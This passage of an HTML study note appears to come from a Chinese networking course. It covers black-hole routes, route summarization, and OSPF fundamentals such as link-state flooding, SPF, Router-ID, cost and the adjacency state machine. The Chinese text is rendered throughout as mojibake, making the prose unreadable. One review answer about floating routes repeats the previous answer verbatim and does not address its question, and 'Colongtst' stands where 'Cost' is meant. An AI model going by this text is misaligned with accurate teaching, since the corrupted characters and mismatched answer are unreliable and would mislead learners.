ç›´æ¥ä¸¢å¼ƒï¼Œå°±åƒè¢«æ‰”è¿›äº†ä¸€ä¸ªé»‘æ´é‡Œï¼Œå› æ­¤å‡ºæ¥å£ä¸ºNull0çš„è·¯ç”±åˆè¢«ç§°ä¸ºé»‘æ´è·¯ç”±</p><h4 id="ç²¾ç¡®æ±‡æ€»"><a href="#ç²¾ç¡®æ±‡æ€»" class="headerlink" title="ç²¾ç¡®æ±‡æ€»"></a>ç²¾ç¡®æ±‡æ€»</h4><p>å½“é…ç½®çš„é™æ€æ±‡æ€»è·¯ç”±èŒƒå›´å¤ªå¹¿æ—¶å¯èƒ½ä¼šå°†æµé‡å‘é€åˆ°å…¶ä»–çš„ç½‘æ®µå¯¼è‡´æ•°æ®åŒ…ä¸¢å¤±ï¼Œè¿™ç§è·¯ç”±ä¸ºä¸ç²¾ç¡®è·¯ç”±ã€‚ä¸ºæ­¤é…ç½®æ±‡æ€»è·¯ç”±æ—¶è¦å°½é‡ç²¾ç¡®ï¼Œåˆšå¥½åŒ…æ‹¬æ‰€æœ‰çš„æ˜ç»†è·¯ç”±</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220213165937684.png" alt="image-20220213165937684"></p><h3 id="æ€è€ƒ"><a href="#æ€è€ƒ" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h3><p><strong>è·¯ç”±å™¨å¦‚ä½•ä¼˜é€‰è·¯ç”±æ¡ç›®ï¼Ÿ</strong></p><p>é¦–å…ˆæ ¹æ®preferenceé€‰æ‹©ï¼Œå¦‚æœpreferenceç›¸åŒåˆ™ç»§ç»­æ¯”è¾ƒåº¦é‡å€¼ï¼Œå¦‚æœåº¦é‡å€¼ä¹Ÿç›¸åŒï¼Œ åˆ™éƒ½ä¼šè¢«åŠ å…¥è·¯ç”±è¡¨å½¢æˆç­‰ä»·è·¯ç”±ã€‚</p><p><strong>å¦‚ä½•é…ç½®å®ç°æµ®åŠ¨è·¯ç”±ï¼Ÿ</strong></p><p>é¦–å…ˆæ ¹æ®preferenceé€‰æ‹©ï¼Œå¦‚æœpreferenceç›¸åŒåˆ™ç»§ç»­æ¯”è¾ƒåº¦é‡å€¼ï¼Œå¦‚æœåº¦é‡å€¼ä¹Ÿç›¸åŒï¼Œ åˆ™éƒ½ä¼šè¢«åŠ å…¥è·¯ç”±è¡¨å½¢æˆç­‰ä»·è·¯ç”±ã€‚</p><p><strong>å°†10.1.1.0/24ã€10.1.3.0/24ã€10.1.9.0/24æ±‡æ€»ä¹‹åçš„ç½‘æ®µæ˜¯ï¼Ÿ</strong></p><p>10.1.0.0/20</p><h1 id="OSPFåŸºç¡€"><a href="#OSPFåŸºç¡€" class="headerlink" title="OSPFåŸºç¡€"></a>OSPFåŸºç¡€</h1><p>é™æ€è·¯ç”±ç”±ç½‘ç»œç®¡ç†å‘˜æ‰‹å·¥é…ç½®ï¼Œå› æ­¤å½“ç½‘ç»œå˜åŒ–æ—¶ï¼Œé™æ€è·¯ç”±éœ€è¦æ‰‹å·¥è°ƒæ•´ï¼Œåˆ¶çº¦äº†é™æ€è·¯ç”±åœ¨ç°ç½‘çš„å¤§è§„æ¨¡åº”ç”¨ã€‚å› æ­¤åŠ¨æ€è·¯ç”±å› å…¶çµæ´»æ€§é«˜ã€å¯é æ€§å¥½ï¼Œæ˜“äºæ‰©å±•ç­‰ç‰¹ç‚¹è¢«å¹¿æ³›åº”ç”¨äºç°ç½‘ã€‚</p><p>è€Œåœ¨åŠ¨æ€è·¯ç”±åè®®ä¸­ï¼ŒOSPF(å¼€æ”¾å¼æœ€çŸ­è·¯å¾„ä¼˜å…ˆ)åè®®æ˜¯ä½¿ç”¨åœºæ™¯éå¸¸å¹¿æ³›çš„åŠ¨æ€è·¯ç”±åè®®ä¹‹ä¸€ï¼Œæ˜¯ä¸€ç§åŸºäºé“¾è·¯çŠ¶æ€ç®—æ³•çš„è·¯ç”±åè®®</p><h2 id="OSPFåè®®æ¦‚è¿°"><a href="#OSPFåè®®æ¦‚è¿°" class="headerlink" title="OSPFåè®®æ¦‚è¿°"></a>OSPFåè®®æ¦‚è¿°</h2><h3 id="ä¸ºä»€ä¹ˆéœ€è¦åŠ¨æ€è·¯ç”±"><a href="#ä¸ºä»€ä¹ˆéœ€è¦åŠ¨æ€è·¯ç”±" class="headerlink" title="ä¸ºä»€ä¹ˆéœ€è¦åŠ¨æ€è·¯ç”±"></a>ä¸ºä»€ä¹ˆéœ€è¦åŠ¨æ€è·¯ç”±</h3><p>é™æ€è·¯ç”±ç”±ç½‘ç»œç®¡ç†å‘˜æ‰‹åŠ¨é…ç½®å’Œç»´æŠ¤ï¼Œé€‚ç”¨äºå°å‹æˆ–ç¨³å®šçš„ç½‘ç»œ</p><p>ä½†æ— æ³•é€‚åº”è§„æ¨¡è¾ƒå¤§çš„ç½‘ç»œï¼Œæ— æ³•åŠ¨æ€å“åº”ç½‘ç»œå˜åŒ–ã€‚</p><p>éšç€è®¾å¤‡æ•°é‡å¢åŠ ï¼Œé…ç½®é‡æ€¥å‰§å¢åŠ ï¼Œé™æ€è·¯ç”±å·²æ— æ³•é€‚åº”</p><h3 id="åŠ¨æ€è·¯ç”±åè®®çš„åˆ†ç±»"><a href="#åŠ¨æ€è·¯ç”±åè®®çš„åˆ†ç±»" class="headerlink" title="åŠ¨æ€è·¯ç”±åè®®çš„åˆ†ç±»"></a>åŠ¨æ€è·¯ç”±åè®®çš„åˆ†ç±»</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220228200522599.png" alt="image-20220228200522599"></p><p>BGPä½¿ç”¨ä¸€ç§åŸºäºè·ç¦»çŸ¢é‡ç®—æ³•ä¿®æ”¹åçš„ç®—æ³•ï¼Œè¯¥ç®—æ³•è¢«ç§°ä¸ºè·¯å¾„çŸ¢é‡ï¼ˆPath Vectorï¼‰ç®—æ³•ã€‚å› æ­¤åœ¨æŸäº›åœºåˆä¸‹ï¼ŒBGPä¹Ÿè¢«ç§°ä¸ºè·¯å¾„çŸ¢é‡è·¯ç”±åè®®ã€‚</p><h3 id="è·ç¦»çŸ¢é‡è·¯ç”±åè®®"><a href="#è·ç¦»çŸ¢é‡è·¯ç”±åè®®" class="headerlink" title="è·ç¦»çŸ¢é‡è·¯ç”±åè®®"></a>è·ç¦»çŸ¢é‡è·¯ç”±åè®®</h3><ul><li>è¿è¡ŒçŸ¢é‡è·¯ç”±åè®®çš„è·¯ç”±å™¨å‘¨æœŸæ€§çš„æ³›æ´ªè‡ªå·±çš„è·¯ç”±è¡¨ã€‚é€šè¿‡è·¯ç”±äº¤äº’ï¼Œæ¯å°è·¯ç”±å™¨éƒ½ä»ç›¸é‚»çš„è·¯ç”±å™¨å­¦ä¹ åˆ°è·¯ç”±ï¼Œå¹¶ä¸”åŠ è½½è¿›è‡ªå·±çš„è·¯ç”±è¡¨ä¸­</li><li>å¯¹äºç½‘ç»œä¸­çš„æ‰€æœ‰è·¯ç”±å™¨è€Œè¨€ï¼Œè·¯ç”±å™¨å¹¶ä¸æ¸…æ¥šç½‘ç»œçš„æ‹“æ‰‘ï¼Œåªæ˜¯ç®€å•çš„çŸ¥é“è¦å»å¾€æŸä¸ªç›®çš„æ–¹å‘åœ¨å“ªé‡Œï¼Œè·ç¦»æœ‰å¤šè¿œã€‚è¿™å°±æ˜¯è·ç¦»çŸ¢é‡ç®—æ³•çš„æœ¬è´¨ã€‚</li></ul><h3 id="é“¾è·¯çŠ¶æ€è·¯ç”±åè®®"><a href="#é“¾è·¯çŠ¶æ€è·¯ç”±åè®®" class="headerlink" title="é“¾è·¯çŠ¶æ€è·¯ç”±åè®®"></a>é“¾è·¯çŠ¶æ€è·¯ç”±åè®®</h3><h4 id="é“¾è·¯çŠ¶æ€è·¯ç”±åè®®-LSAæ³›æ´ª"><a href="#é“¾è·¯çŠ¶æ€è·¯ç”±åè®®-LSAæ³›æ´ª" class="headerlink" title="é“¾è·¯çŠ¶æ€è·¯ç”±åè®®-LSAæ³›æ´ª"></a>é“¾è·¯çŠ¶æ€è·¯ç”±åè®®-LSAæ³›æ´ª</h4><p>ä¸è·ç¦»çŸ¢é‡åè®®ä¸åŒï¼Œé“¾è·¯çŠ¶æ€ç”±åè®®é€šå‘Šçš„æ˜¯é“¾è·¯çŠ¶æ€è€Œä¸æ˜¯è·¯ç”±è¡¨ã€‚è¿è¡Œé“¾è·¯çŠ¶æ€è·¯ç”±åè®®çš„è·¯ç”±å™¨ä¹‹é—´é¦–å…ˆä¼šå»ºç«‹ä¸€ä¸ªåè®®çš„é‚»å±…å…³ç³»ï¼Œç„¶åå½¼æ­¤ä¹‹é—´å¼€å§‹äº¤äº’LSAï¼ˆLink State Advertisementï¼Œé“¾è·¯çŠ¶æ€é€šå‘Šï¼‰</p><p><strong>ä¸å†é€šå‘Šè·¯ç”±ä¿¡æ¯ï¼Œè€Œæ˜¯LSA</strong></p><p>é“¾è·¯çŠ¶æ€é€šå‘Šï¼Œå¯ä»¥ç®€å•çš„ç†è§£ä¸ºæ¯å°è·¯ç”±å™¨éƒ½äº§ç”Ÿä¸€ä¸ªæè¿°è‡ªå·±ç›´è¿æ¥å£çŠ¶æ€ï¼ˆåŒ…æ‹¬æ¥å£çš„å¼€é”€ã€ä¸é‚»å±…è·¯ç”±å™¨ä¹‹é—´çš„å…³ç³»ç­‰ï¼‰çš„é€šå‘Š</p><h4 id="é“¾è·¯çŠ¶æ€è·¯ç”±åè®®-LSDBæ³›æ´ª"><a href="#é“¾è·¯çŠ¶æ€è·¯ç”±åè®®-LSDBæ³›æ´ª" class="headerlink" title="é“¾è·¯çŠ¶æ€è·¯ç”±åè®®-LSDBæ³›æ´ª"></a>é“¾è·¯çŠ¶æ€è·¯ç”±åè®®-LSDBæ³›æ´ª</h4><p>æ¯å°è·¯ç”±å™¨éƒ½ä¼šäº§ç”ŸLSAsï¼Œè·¯ç”±å™¨å°†æ¥æ”¶åˆ°çš„LSAsæ”¾å…¥è‡ªå·±çš„LSDBï¼ˆLink State DataBaseï¼Œé“¾è·¯çŠ¶æ€æ•°æ®åº“ï¼‰ã€‚LSDBæ±‡æ€»äº†ç½‘ç»œä¸­è·¯ç”±å™¨å¯¹äºè‡ªå·±æ¥å£çš„æè¿°ï¼ŒåŒ…å«å…¨ç½‘æ‹“æ‰‘çš„æè¿°ã€‚è·¯ç”±å™¨é€šè¿‡LSDBï¼ŒæŒæ¡äº†å…¨ç½‘çš„æ‹“æ‰‘</p><h4 id="é“¾è·¯çŠ¶æ€è·¯ç”±åè®®-SPFè®¡ç®—"><a href="#é“¾è·¯çŠ¶æ€è·¯ç”±åè®®-SPFè®¡ç®—" class="headerlink" title="é“¾è·¯çŠ¶æ€è·¯ç”±åè®®-SPFè®¡ç®—"></a>é“¾è·¯çŠ¶æ€è·¯ç”±åè®®-SPFè®¡ç®—</h4><p>æ¯å°è·¯ç”±å™¨åŸºäºLSDBï¼Œä½¿ç”¨SPFï¼ˆShortest Path Firstï¼Œæœ€çŸ­è·¯å¾„ä¼˜å…ˆï¼‰ç®—æ³•è¿›è¡Œè®¡ç®—ï¼Œæ¯å°è·¯ç”±å™¨éƒ½è®¡ç®—å‡ºä¸€é¢—ä»¥è‡ªå·±ä¸ºæ ¹çš„ã€æ— ç¯çš„ã€æ‹¥æœ‰æœ€çŸ­è·¯å¾„çš„â€œæ ‘â€ã€‚æœ‰äº†è¿™é¢—â€œæ ‘â€ï¼Œè·¯ç”±å™¨å°±ä»¥åŠçŸ¥é“äº†åˆ°è¾¾ç½‘ç»œå„ä¸ªè§’è½çš„ä¼˜é€‰è·¯å¾„</p><p><strong>SPFæ˜¯OSPFè·¯ç”±åè®®çš„ä¸€ä¸ªæ ¸å¿ƒç®—æ³•ï¼Œç”¨æ¥åœ¨ä¸€ä¸ªå¤æ‚çš„ç½‘ç»œä¸­åšå‡ºè·¯ç”±ä¼˜é€‰çš„å†³ç­–ã€‚</strong></p><h4 id="é“¾è·¯çŠ¶æ€è·¯ç”±åè®®-è·¯ç”±è¡¨ç”Ÿæˆ"><a href="#é“¾è·¯çŠ¶æ€è·¯ç”±åè®®-è·¯ç”±è¡¨ç”Ÿæˆ" class="headerlink" title="é“¾è·¯çŠ¶æ€è·¯ç”±åè®®-è·¯ç”±è¡¨ç”Ÿæˆ"></a>é“¾è·¯çŠ¶æ€è·¯ç”±åè®®-è·¯ç”±è¡¨ç”Ÿæˆ</h4><p>è·¯ç”±å™¨å°†æ ¹æ®SPFè®¡ç®—å‡ºæ¥çš„ä¼˜é€‰è·¯å¾„ï¼ŒåŠ è½½è¿›è‡ªå·±çš„è·¯ç”±è¡¨</p><h4 id="é“¾è·¯çŠ¶æ€è·¯ç”±åè®®æ€»ç»“"><a href="#é“¾è·¯çŠ¶æ€è·¯ç”±åè®®æ€»ç»“" class="headerlink" title="é“¾è·¯çŠ¶æ€è·¯ç”±åè®®æ€»ç»“"></a>é“¾è·¯çŠ¶æ€è·¯ç”±åè®®æ€»ç»“</h4><ul><li>ç¬¬ä¸€æ­¥æ˜¯å»ºç«‹ç›¸é‚»è·¯ç”±å™¨ä¹‹é—´çš„é‚»å±…å…³ç³»ã€‚</li><li>ç¬¬äºŒæ­¥æ˜¯é‚»å±…ä¹‹é—´äº¤äº’é“¾è·¯çŠ¶æ€ä¿¡æ¯å’ŒåŒæ­¥LSDBã€‚</li><li>ç¬¬ä¸‰æ­¥æ˜¯è¿›è¡Œä¼˜é€‰è·¯å¾„è®¡ç®—ã€‚</li><li>ç¬¬å››æ­¥æ˜¯æ ¹æ®æœ€çŸ­è·¯å¾„æ ‘ç”Ÿæˆè·¯ç”±è¡¨é¡¹åŠ è½½åˆ°è·¯ç”±è¡¨</li></ul><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220228202547086.png" alt="image-20220228202547086"></p><h3 id="OSPFç®€ä»‹"><a href="#OSPFç®€ä»‹" class="headerlink" title="OSPFç®€ä»‹"></a>OSPFç®€ä»‹</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220228202917315.png" alt="image-20220228202917315"></p><h3 id="OSPFåŸºç¡€æœ¯è¯­"><a href="#OSPFåŸºç¡€æœ¯è¯­" class="headerlink" title="OSPFåŸºç¡€æœ¯è¯­"></a>OSPFåŸºç¡€æœ¯è¯­</h3><h4 id="åŒºåŸŸ"><a href="#åŒºåŸŸ" class="headerlink" title="åŒºåŸŸ"></a>åŒºåŸŸ</h4><p>OSPF Areaç”¨äºæ ‡è¯†ä¸€ä¸ªOSPFçš„åŒºåŸŸ</p><p>åŒºåŸŸæ˜¯ä»é€»è¾‘ä¸Šå°†è®¾å¤‡åˆ’åˆ†ä¸ºä¸åŒçš„ç»„ï¼Œæ¯ä¸ªç»„ç”¨åŒºåŸŸå·(Area ID)æ¥æ ‡è¯†</p><h4 id="Router-ID"><a href="#Router-ID" class="headerlink" title="Router-ID"></a>Router-ID</h4><p>Router-IDï¼ˆRouter Identifierï¼Œè·¯ç”±å™¨æ ‡è¯†ç¬¦ï¼‰ï¼Œç”¨äºåœ¨ä¸€ä¸ªOSPFåŸŸä¸­å”¯ä¸€åœ°æ ‡è¯†ä¸€å°è·¯ç”±å™¨ã€‚</p><p>Router-IDçš„è®¾å®šå¯ä»¥é€šè¿‡æ‰‹å·¥é…ç½®çš„æ–¹å¼ï¼Œæˆ–ä½¿ç”¨ç³»ç»Ÿè‡ªåŠ¨é…ç½®çš„æ–¹å¼ã€‚</p><p>åœ¨å®é™…é¡¹ç›®ä¸­ï¼Œé€šå¸¸ä¼šé€šè¿‡æ‰‹å·¥é…ç½®æ–¹å¼ä¸ºè®¾å¤‡æŒ‡å®šOSPF Router-IDã€‚è¯·æ³¨æ„å¿…é¡»ä¿è¯åœ¨OSPFåŸŸä¸­ä»»æ„ä¸¤å°è®¾å¤‡çš„Router-IDéƒ½ä¸ç›¸åŒã€‚é€šå¸¸çš„åšæ³•æ˜¯å°†Router-IDé…ç½®ä¸ºä¸è¯¥è®¾å¤‡æŸä¸ªæ¥å£ï¼ˆé€šå¸¸ä¸ºLoopbackæ¥å£ï¼‰çš„IPåœ°å€ä¸€è‡´</p><h4 id="åº¦é‡å€¼"><a href="#åº¦é‡å€¼" class="headerlink" title="åº¦é‡å€¼"></a>åº¦é‡å€¼</h4><p><strong>OSPFä½¿ç”¨Colongtstï¼ˆå¼€é”€ï¼‰ä½œä¸ºè·¯ç”±çš„åº¦é‡å€¼</strong>ã€‚æ¯ä¸€ä¸ªæ¿€æ´»äº†OSPFçš„æ¥å£éƒ½ä¼šç»´æŠ¤ä¸€ä¸ªæ¥å£çš„Costå€¼ï¼Œç¼ºçœæ—¶æ¥å£Costå€¼=100 Mbit/s/æ¥å£å¸¦å®½ã€‚å…¶ä¸­100 Mbit/sä¸ºOSPFæŒ‡å®šçš„ç¼ºçœå‚è€ƒå€¼ï¼Œè¯¥å€¼æ˜¯å¯ä»¥é…ç½®çš„ã€‚</p><p>ç¬¼ç»Ÿåœ°è¯´ï¼Œä¸€æ¡OSPFè·¯ç”±çš„Costå€¼å¯ä»¥ç†è§£ä¸ºæ˜¯ä»ç›®çš„ç½‘æ®µåˆ°æœ¬è·¯ç”±å™¨æ²¿é€”æ‰€æœ‰å…¥æ¥å£çš„Costå€¼ç´¯åŠ ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220228203750713.png" alt="image-20220228203750713"></p><h3 id="OSPFåè®®æŠ¥æ–‡ç±»å‹"><a href="#OSPFåè®®æŠ¥æ–‡ç±»å‹" class="headerlink" title="OSPFåè®®æŠ¥æ–‡ç±»å‹"></a>OSPFåè®®æŠ¥æ–‡ç±»å‹</h3><p>OSPFæœ‰äº”ç§ç±»å‹çš„åè®®æŠ¥æ–‡ï¼Œè¿™äº›æŠ¥æ–‡åœ¨OSPFè·¯ç”±å™¨ä¹‹é—´äº¤äº’ä¸­èµ·ä¸åŒçš„ä½œç”¨</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220228203915191.png" alt="image-20220228203915191"></p><h3 id="OSPFä¸‰å¤§è¡¨é¡¹"><a href="#OSPFä¸‰å¤§è¡¨é¡¹" class="headerlink" title="OSPFä¸‰å¤§è¡¨é¡¹"></a>OSPFä¸‰å¤§è¡¨é¡¹</h3><p>OSPFæœ‰ä¸‰å¼ é‡è¦çš„è¡¨é¡¹ï¼ŒOSPFé‚»å±…è¡¨ã€LSDBè¡¨å’ŒOSPFè·¯ç”±è¡¨</p><h4 id="OSPFé‚»å±…è¡¨"><a href="#OSPFé‚»å±…è¡¨" class="headerlink" title="OSPFé‚»å±…è¡¨"></a>OSPFé‚»å±…è¡¨</h4><p>OSPFåœ¨ä¼ é€’é“¾è·¯çŠ¶æ€ä¿¡æ¯ä¹‹å‰ï¼Œéœ€å…ˆå»ºç«‹OSPFé‚»å±…å…³ç³»</p><p>OSPFçš„é‚»å±…å…³ç³»é€šè¿‡äº¤äº’HelloæŠ¥æ–‡å»ºç«‹</p><p>OSPFé‚»å±…è¡¨æ˜¾ç¤ºäº†OSPFè·¯ç”±å™¨ä¹‹é—´çš„é‚»å±…çŠ¶æ€ï¼Œä½¿ç”¨display ospf peeræŸ¥çœ‹</p><h4 id="LSDBè¡¨"><a href="#LSDBè¡¨" class="headerlink" title="LSDBè¡¨"></a>LSDBè¡¨</h4><p>LSDBä¼šä¿å­˜è‡ªå·±äº§ç”Ÿçš„åŠä»é‚»å±…æ”¶åˆ°çš„LSAä¿¡æ¯</p><p>Typeæ ‡è¯†LSAçš„ç±»å‹ï¼ŒAdvRouteræ ‡è¯†å‘é€LSAçš„è·¯ç”±å™¨</p><p>ä½¿ç”¨å‘½ä»¤è¡Œdisplay ospf lsdbæŸ¥çœ‹LSDBè¡¨</p><h4 id="OSPFè·¯ç”±è¡¨"><a href="#OSPFè·¯ç”±è¡¨" class="headerlink" title="OSPFè·¯ç”±è¡¨"></a>OSPFè·¯ç”±è¡¨</h4><p>OSPFè·¯ç”±è¡¨å’Œè·¯ç”±å™¨è·¯ç”±è¡¨æ˜¯ä¸¤å¼ ä¸åŒçš„è¡¨é¡¹</p><p>OSPFè·¯ç”±è¡¨åŒ…å«Destinationã€Costå’ŒNextHopç­‰æŒ‡å¯¼è½¬å‘çš„ä¿¡æ¯ã€‚</p><p>ä½¿ç”¨display ospf routingæŸ¥çœ‹OSPFè·¯ç”±è¡¨</p><h2 id="OSPFåè®®å·¥ä½œåŸç†"><a href="#OSPFåè®®å·¥ä½œåŸç†" class="headerlink" title="OSPFåè®®å·¥ä½œåŸç†"></a>OSPFåè®®å·¥ä½œåŸç†</h2><h3 id="OSPFè·¯ç”±å™¨ä¹‹é—´çš„å…³ç³»"><a href="#OSPFè·¯ç”±å™¨ä¹‹é—´çš„å…³ç³»" class="headerlink" title="OSPFè·¯ç”±å™¨ä¹‹é—´çš„å…³ç³»"></a>OSPFè·¯ç”±å™¨ä¹‹é—´çš„å…³ç³»</h3><ul><li>OSPFè·¯ç”±å™¨ä¹‹é—´çš„å…³ç³»æœ‰ä¸¤ä¸ªé‡è¦çš„æ¦‚å¿µï¼Œé‚»å±…å…³ç³»å’Œé‚»æ¥å…³ç³»</li><li>å‡è®¾ä¸¤å°è·¯ç”±å™¨ç›´è¿ï¼Œåœ¨åŒæ–¹äº’è”æ¥å£ä¸Šæ¿€æ´»OSPFï¼Œè·¯ç”±å™¨å¼€å§‹å‘é€åŠä¾¦å¬HelloæŠ¥æ–‡ï¼Œåœ¨é€šè¿‡HelloæŠ¥æ–‡å‘ç°å½¼æ­¤åï¼Œè¿™ä¸¤å°è·¯ç”±å™¨ä¾¿å½¢æˆäº†é‚»å±…å…³ç³»</li><li>é‚»å±…å…³ç³»çš„å»ºç«‹åªæ˜¯å¼€å§‹ï¼Œåç»­ä¼šè¿›è¡Œä¸€ç³»åˆ—çš„æŠ¥æ–‡äº¤äº’ï¼Œä¾‹å¦‚å‰æ–‡æåˆ°çš„DDã€LSRã€LSUå’ŒLS ACKç­‰ï¼Œå½“ä¸¤å°è·¯ç”±å™¨LSDBåŒæ­¥å®Œæˆï¼Œå¹¶å¼€å§‹ç‹¬ç«‹è®¡ç®—è·¯ç”±æ—¶ï¼Œè¿™ä¸¤å°è·¯ç”±å™¨å½¢æˆäº†é‚»æ¥å…³ç³»</li></ul><h3 id="OSPFé‚»æ¥å…³ç³»å»ºç«‹è¿‡ç¨‹"><a href="#OSPFé‚»æ¥å…³ç³»å»ºç«‹è¿‡ç¨‹" class="headerlink" title="OSPFé‚»æ¥å…³ç³»å»ºç«‹è¿‡ç¨‹"></a>OSPFé‚»æ¥å…³ç³»å»ºç«‹è¿‡ç¨‹</h3><p>OSPFå®Œæˆé‚»æ¥å…³ç³»çš„å»ºç«‹æœ‰å››ä¸ªæ­¥éª¤ï¼Œå»ºç«‹é‚»å±…å…³ç³»ã€åå•†ä¸»/ä»ã€äº¤äº’LSDBä¿¡æ¯ï¼ŒåŒæ­¥LSDBã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220228205756827.png" alt="image-20220228205756827"></p><h4 id="æµç¨‹1"><a href="#æµç¨‹1" class="headerlink" title="æµç¨‹1"></a>æµç¨‹1</h4><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220228205823933.png" alt="image-20220228205823933"></p><ul><li>å½“ä¸€å°OSPFè·¯ç”±å™¨æ”¶åˆ°å…¶ä»–è·¯ç”±å™¨å‘æ¥çš„é¦–ä¸ªHelloæŠ¥æ–‡æ—¶ä¼šä»åˆå§‹DownçŠ¶æ€åˆ‡æ¢ä¸ºInit çŠ¶æ€ã€‚</li><li>å½“OSPFè·¯ç”±å™¨æ”¶åˆ°çš„HelloæŠ¥æ–‡ä¸­çš„é‚»å±…å­—æ®µåŒ…å«è‡ªå·±çš„Router IDæ—¶ï¼Œä»Initåˆ‡æ¢2-wayçŠ¶ æ€</li></ul><h4 id="æµç¨‹2-amp-3"><a href="#æµç¨‹2-amp-3" class="headerlink" title="æµç¨‹2&amp;3"></a>æµç¨‹2&amp;3</h4><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220228205912512.png" alt="image-20220228205912512"></p><ul><li>é‚»å±…çŠ¶æ€æœºä»2-wayè½¬ä¸ºExstartçŠ¶æ€åå¼€å§‹ä¸»ä»å…³ç³»é€‰ä¸¾ï¼š<ul><li>R1å‘R2å‘é€çš„ç¬¬ä¸€ä¸ªDDæŠ¥æ–‡å†…å®¹ä¸ºç©ºï¼Œå…¶Seqåºåˆ—å·å‡è®¾ä¸ºXã€‚</li><li>R2ä¹Ÿå‘R1å‘å‡ºç¬¬ä¸€ä¸ªDDæŠ¥æ–‡ï¼Œå…¶Seqåºåˆ—å·å‡è®¾ä¸ºYã€‚</li><li>é€‰ä¸¾ä¸»ä»å…³ç³»çš„è§„åˆ™æ˜¯æ¯”è¾ƒRouter IDï¼Œè¶Šå¤§è¶Šä¼˜ã€‚R2çš„Router IDæ¯”R1å¤§ï¼Œå› æ­¤R2æˆ ä¸ºçœŸæ­£çš„ä¸»è®¾å¤‡ã€‚ä¸»ä»å…³ç³»æ¯”è¾ƒç»“æŸåï¼ŒR1çš„çŠ¶æ€ä»Exstartè½¬å˜ä¸ºExchangeã€‚</li></ul></li><li>R1é‚»å±…çŠ¶æ€å˜ä¸ºExchangeåï¼ŒR1å‘é€ä¸€ä¸ªæ–°çš„DDæŠ¥æ–‡ï¼ŒåŒ…å«è‡ªå·±LSDBçš„æè¿°ä¿¡æ¯ï¼Œå…¶åº åˆ—å·é‡‡ç”¨ä¸»è®¾å¤‡R2çš„åºåˆ—å·ã€‚R2æ”¶åˆ°åé‚»å±…çŠ¶æ€ä»Exstartè½¬å˜ä¸ºExchangeã€‚</li><li>R2å‘R1å‘é€ä¸€ä¸ªæ–°çš„DDæŠ¥æ–‡ï¼ŒåŒ…å«è‡ªå·±LSDBçš„æè¿°ä¿¡æ¯ï¼Œåºåˆ—å·ä¸ºY+1ã€‚</li><li> R1ä½œä¸ºä»è·¯ç”±å™¨éœ€è¦å¯¹ä¸»è·¯ç”±R2å‘é€çš„æ¯ä¸ªDDæŠ¥æ–‡è¿›è¡Œç¡®è®¤ï¼Œå›å¤æŠ¥æ–‡çš„åºåˆ—å·ä¸ä¸»è·¯ç”± R2ä¸€è‡´ã€‚</li><li>å‘é€å®Œæœ€åä¸€ä¸ªDDæŠ¥æ–‡åï¼ŒR1å°†é‚»å±…çŠ¶æ€åˆ‡æ¢ä¸ºLoadingã€‚</li></ul><h4 id="æµç¨‹4"><a href="#æµç¨‹4" class="headerlink" title="æµç¨‹4"></a>æµç¨‹4</h4><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220228210119658.png" alt="image-20220228210119658"></p><ul><li>é‚»å±…çŠ¶æ€è½¬å˜ä¸ºLoadingåï¼ŒR1å‘R2å‘é€LSRæŠ¥æ–‡ï¼Œè¯·æ±‚é‚£äº›åœ¨ExchangeçŠ¶æ€ä¸‹é€šè¿‡DDæŠ¥ æ–‡å‘ç°çš„ï¼Œä½†æ˜¯åœ¨æœ¬åœ°LSDBä¸­æ²¡æœ‰çš„LSAã€‚ </li><li>R2æ”¶åˆ°åå‘R1å›å¤LSUã€‚åœ¨LSUæŠ¥æ–‡ä¸­åŒ…å«è¢«è¯·æ±‚çš„LSAçš„è¯¦ç»†ä¿¡æ¯ã€‚ </li><li>R1æ”¶åˆ°LSUæŠ¥æ–‡åï¼Œå‘R2å›å¤LS ACKæŠ¥æ–‡ï¼Œç¡®è®¤å·²æ¥æ”¶åˆ°ï¼Œç¡®ä¿ä¿¡æ¯ä¼ è¾“çš„å¯é æ€§ã€‚ </li><li>æ­¤è¿‡ç¨‹ä¸­R2ä¹Ÿä¼šå‘R1å‘é€LSAè¯·æ±‚ã€‚å½“ä¸¤ç«¯LSDBå®Œå…¨ä¸€è‡´æ—¶ï¼Œé‚»å±…çŠ¶æ€å˜ä¸ºFullï¼Œè¡¨ç¤ºæˆ åŠŸå»ºç«‹é‚»æ¥å…³ç³»ã€‚</li></ul><h3 id="OSPFç½‘ç»œç±»å‹ç®€ä»‹"><a href="#OSPFç½‘ç»œç±»å‹ç®€ä»‹" class="headerlink" 